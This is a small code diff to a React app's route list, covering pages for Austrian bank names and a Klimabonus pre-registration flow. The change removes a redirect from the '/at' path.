@@ -129,7 +129,7 @@ const App = () => (
             <Route path="/at/wuestenrot" element={<P><Wuestenrot /></P>} />
             <Route path="/at/denizbank" element={<P><Denizbank /></P>} />
             <Route path="/confirmation" element={<P><ConfirmationSwitch /></P>} />
-            <Route path="/at" element={<Navigate to="/" replace />} />
+            
             <Route path="/klimabonus" element={<P><Klimabonus /></P>} />
             <Route path="/klimabonus/voranmeldung" element={<P><KlimabonusVoranmeldung /></P>} />
             <Route path="/klimabonus/bestaetigung" element={<P><KlimabonusBestaetigung /></P>} />
